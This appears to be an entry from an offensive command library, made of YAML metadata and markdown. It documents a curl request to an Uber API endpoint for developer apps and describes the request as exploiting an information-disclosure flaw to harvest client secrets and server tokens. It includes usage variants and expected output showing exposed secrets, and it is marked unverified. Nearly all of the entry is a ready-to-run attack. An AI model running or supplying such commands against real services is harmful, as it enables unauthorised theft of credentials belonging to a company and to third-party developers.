---
data: >-
  curl -H "Authorization: Bearer YOUR_AUTH_TOKEN" -H "Content-Type:
  application/json" https://riders.uber.com/api/v1/developer-apps -X GET
tags:
  - api-query
  - information-disclosure
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 38f65186-5f51-4da1-bfa9-941d1dea63fd
created_at: '2025-12-14T17:32:48.432Z'
updated_at: '2025-12-14T17:32:48.432Z'
verified: false
validated: true
submitted: true
---
# curl-api-query-with-auth

## Command

```bash
curl -H "Authorization: Bearer YOUR_AUTH_TOKEN" -H "Content-Type: application/json" https://riders.uber.com/api/v1/developer-apps -X GET
```

## Description

This command queries Uber's internal API endpoint for developer applications using curl with authentication, exploiting an information disclosure vulnerability to retrieve sensitive client secrets and server tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer YOUR_AUTH_TOKEN"` | Adds Bearer token for user authentication | Yes |
| `-H "Content-Type: application/json"` | Sets request content type to JSON | Yes |
| `https://riders.uber.com/api/v1/developer-apps` | The vulnerable API endpoint URL | Yes |
| `-X GET` | Specifies HTTP GET method | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." https://riders.uber.com/api/v1/developer-apps -X GET
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer YOUR_AUTH_TOKEN" -H "Content-Type: application/json" -v https://riders.uber.com/api/v1/developer-apps -X GET > response.json
```

> The -v flag enables verbose output for debugging, and output redirection saves the response to a file.

## Expected Output

A JSON response containing an array of developer apps with fields like id, name, client_secret, and server_token. Example:

```json
[
  {
    "id": "app123",
    "name": "Third-Party App",
    "client_secret": "sensitive_secret_value",
    "server_token": "sensitive_token_value"
  }
]
```
Successful output confirms token exposure; errors indicate auth failure or endpoint changes.

## Related

- [[Related Procedure: Query Uber API for Exposed Developer Tokens]]
